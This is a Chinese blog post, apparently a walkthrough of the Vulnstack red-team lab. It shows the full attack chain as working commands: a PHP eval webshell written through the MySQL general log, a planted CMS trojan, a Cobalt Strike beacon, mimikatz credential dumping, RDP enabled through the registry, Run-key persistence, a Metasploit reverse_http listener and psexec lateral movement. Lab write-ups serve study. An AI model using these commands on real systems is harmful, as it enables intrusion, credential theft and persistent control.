---
layout:     post
title:      红队评估
subtitle:   vulnstack红队评估
date:       2022-07-25
author:     Sprint#51264
header-img: img/post-bg-universe.jpg
catalog: true
tags:
    - vulnstack
---
<!-- TOC -->

- [引言](#%E5%BC%95%E8%A8%80)
- [环境配置](#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE)
- [信息收集](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)
- [漏洞利用](#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8)
- [远程登录](#%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95)
- [内网搜集](#%E5%86%85%E7%BD%91%E6%90%9C%E9%9B%86)
- [权限维持](#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81)
- [横向移动](#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)

<!-- /TOC -->

# 引言

>[Vulnstack(一)（细节）](https://blog.csdn.net/qq_45927266/article/details/121227078)
>[vulnstack1--红队靶机（域渗透）](https://blog.csdn.net/tlovejr/article/details/124396506)
>[phpMyAdmin(mysql)常见的写shell方法及版本漏洞汇总](https://blog.csdn.net/m0_48108919/article/details/123053622)
>[命令行开远程登陆](http://www.hackdig.com/04/hack-330061.htm)



# 环境配置

* 密码过期修改密码

* IP分配

    192.168.48.141      win2003（域成员）
    192.168.48.134  	win7（WEB服务器）         192.168.197.143 
    192.168.48.138	    win2008（域控）
    192.168.197.132     kali（攻击机）

# 信息收集

* 主机发现

    ```s

    arp-scan -l 

    nmap -sP 192.168.197.0/24 

    发现主机192.168.197.134，对其进行服务扫描 

    ```

* 服务发现

    ```s
   
    nmap -sV -A 192.168.197.134

    Not shown: 997 filtered tcp ports (no-response)
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
    |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
    |_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 
    135/tcp  open  msrpc   Microsoft Windows RPC
    3306/tcp open  mysql   MySQL (unauthorized)

    发现其开放了80端口和3306端口
    ```

* 目录扫描

    ```s
     
    dirsearch -u http://192.168.197.134 -o dir.txt
    dirb http://192.168.197.134/
    python3 dirmap.py -i http://192.168.197.134 -lcf


    cat /usr/lib/python3/dist-packages/dirsearch/dir.txt | grep "200"#

    ```

* 指纹识别

    ```s
     
    whatweb http://192.168.197.134 # 无果

    ```

* 源码下载

    ```s
     
    下载下网站源码，看robots.txt发现/data和/protected禁止访问，查看对应内容

    config.php为数据库连接配置文件，找到连接用户名密码均为root，可以登录phpmyadmin
    ```

# 漏洞利用

* 数据库写shell

    >[phpMyAdmin(mysql)常见的写shell方法及版本漏洞汇总](https://blog.csdn.net/m0_48108919/article/details/123053622)
    条件：
    1.知道绝对路径(在php探针页面能看到绝对路径，或者phpinfo页面搜索`DOCUMENT_ROOT`)
    2.有写入权限(查询secure_file_priv参数，查看是否具有读写文件权限，若为NULL则没有办法写入shell。这个值是只读变量，只能通过配置文件修改，且更改后需重启服务才生效)

    ```s
     
    #查路径
    show variables like '%datadir%';
    或者
    select @@basedir

    #查权限
    SHOW GRANTS FOR root@localhost

    SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%'
    
    #日志写shell
    #general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。可以尝试自定义日志文件，并向日志文件里面写入内容的话
    SHOW VARIABLES LIKE '%general%'

    #打开日志
    set global general_log="on"
    
    set global general_log_file="C:/phpStudy/WWW/a.php" #修改日志路径
    select "<?php @eval($_GET['cmd']); ?>"#写shell

    # 这里蚁剑成功了，但是冰蝎没成功，或许和php版本有关？

    ```


* 网站后台写shell

    ```s
     
    访问yxcms目录，发现有信息泄露

    #本站为YXcms的默认演示模板，YXcms是一款基于PHP+MYSQL构建的高效网站管理系统。 后台地址请在网址后面加上/index.php?r=admin进入。 后台的用户名:admin;密码:123456，请进入后修改默认密码。

    登录后台进入前台管理模块，找到index_index.php页面，开头写入一句话木马，蚁剑连接

    cobaltstrike:./teamserver 192.168.197.132 pass#打开服务端
    客户端start.bat打开

    attack->packages->windows executable#生成木马

    蚁剑上传木马到目标主机，再开被控主机虚拟终端执行木马

    CS监听到反弹连接，右键被控机进行提权，

    ```

# 远程登录

* 获取凭证

    ```s
     
    提权system后hashdump->mimikatz获取主机登陆密码hongri@2022#这是之前改过后的密码

    ```

* 开启服务

    ```s
     
    #虚拟终端查询主机是否开启3389
    netstat -ano | findstr "3389"#没开

    >开启桌面最终结果都是操作注册表，所以需要管理员权限
    >并且主机用户是空密码，那就开启不了远程桌面，需要给主机用户添加密码
    >3389是win下的远程桌面端口，需要防火墙的允许。

    netsh advfirewall firewall add rule name="remote Desktop" protocol=TCP dir=in localport=3389 action=allow

    >注册表操作，修改fDenyTSConnections项的值
    >开启远程登录

    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f#操作成功之后再findstr"3389"发现端口已经打开了

    ```

* 登陆

    ```s
     
    rdesktop 192.168.197.134#GOD\Administrator   hongri@2022
    ```

    也可以从CS->Explore->Desktop进行远程连接

# 内网搜集

* 域信息收集

    ```s
     
    net config workstation#查看是否有域以及当前域

    net user /domain#查看域内用户列表

    net group "domain computers" /domain#查看域内成员计算机信息
    #当前计算机名为STU1$，域内还有其他两台计算机为DEV1$和ROOT-TVI862UBEH$

    net group "domain admins" /domain#查看域内管理员
    #域控管理员为OWA$

    #CS会话中可以用lodan扫描内网

    ```

* 内网漏洞扫描

    ```s
     
    用主机上的namp扫描内网及可利用的漏洞
    
    nmap --script=vuln 192.168.48.0/24
    
    #结果显示WEB服务器win7有CVE-2017-0143(MS17-010)
    #141地址机器2003有CVE-2008-4250(MS08-067)和MS17-010
    #138地址机器2008域控有MS17010漏洞
    ```

# 权限维持

>将C:/phpStudy/WWW/artifact.exe添加为注册表启动项：

`reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v evil /t REG_SZ /d "C:\phpStudy\WWW\artifact.exe" /f`

# 横向移动

* msf和cs联动

    ```s
     
    #msf开一个监听模式
    
    use multi/handler

    set payload windows/meterpreter/reverse_http

    set lhost 192.168.197.132

    set lport 9999

    run

    #cs新建listener，payload选foreign http，填kali的IP和端口

    #右键win7机器新开一个spawn，监听器选刚刚建的msf的

    choose之后msf就会建立连接

    ```

* smb

    对主机进行net view，选会话视图，用已有session新建一个spawn，新建listener，类型是Beacon SMB

    将其作为payload

    切换为targets视图，右键未拿下的机器，jump，用psexec使用凭证登录主机，开始监听

    切换图形化sessions界面，能看到主机上线了

    同理拿下最后一台机器

